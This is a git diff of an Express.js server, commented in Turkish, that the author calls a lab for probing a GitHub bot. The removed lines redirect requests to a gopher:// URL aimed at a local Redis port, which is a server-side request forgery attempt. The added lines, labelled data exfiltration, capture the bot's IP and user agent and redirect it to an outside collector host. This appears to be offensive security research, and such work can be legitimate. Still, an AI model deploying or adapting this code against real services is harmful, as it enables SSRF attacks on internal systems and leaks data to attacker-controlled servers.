@@ -25,38 +25,29 @@ app.use((req, res, next) => {
         console.log('--- QUERY PARAMETRELERİ ---');
         console.log(JSON.stringify(req.query, null, 2));
     }
-    
-    if (req.body && Object.keys(req.body).length > 0) {
-        console.log('--- BODY ---');
-        console.log(JSON.stringify(req.body, null, 2));
-    }
     console.log('-'.repeat(50));
     
     next();
 });
 
 // ==========================================
-// TEST ENDPOINTLERİ
+// VERİ SIZDIRMA (DATA EXFILTRATION) ENDPOINT'İ
 // ==========================================
-
-// 1. Ana Sayfa: GitHub botunu veya istekleri istediğin adrese fırlatmak için
 app.all('/', (req, res) => {
-    // Test etmek istediğin hedefi buraya yazabilirsin:
-    // Örn: Standart IP, Decimal IP, Hex IP veya Metadata / Gopher denemeleri
-    const targetUrl = 'gopher://127.0.0.1:6379/_INFO%0d%0a'; // 127.0.0.1 (Hex formatı)
-    
-    console.log(`[!] Yönlendiriliyor ➔ Hedef: ${targetUrl}`);
-    
-    // 302 Found ile hedef adrese yönlendir
-    return res.redirect(302, targetUrl);
-});
+    const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || 'bilinmiyor';
+    const userAgent = req.headers['user-agent'] || 'bilinmiyor';
 
-// 2. Özel Yakalama Endpoint'i (Görsel veya dosya süsü vermek istersen)
-app.all('/yakalandi', (req, res) => {
-    res.status(200).send('<h1>Hedef başarıyla yakalandı ve loglandı!</h1>');
+    // GitHub botunun bilgilerini query parametreleri olarak hedef URL'e ekliyoruz
+    // Not: Buradaki hedefi kendi dış sunucuna veya loglama servisine (örn. webhook.site) çevirebilirsin
+    const targetUrl = `https://collab-wrud.onrender.com?bot_ip=${encodeURIComponent(clientIp)}&ua=${encodeURIComponent(userAgent)}`;
+    
+    console.log(`[!] Veri sızdırma yönlendirmesi ➔ ${targetUrl}`);
+    
+    // 302 Found ile botu yönlendir
+    return res.redirect(302, targetUrl);
 });
 
 // Sunucuyu başlat
 app.listen(PORT, () => {
-    console.log(`🔥 Lab sunucusu ${PORT} portunda aktif ve avını bekliyor...`);
+    console.log(`🔥 Veri sızdırma avcısı ${PORT} portunda devrede!`);
 });
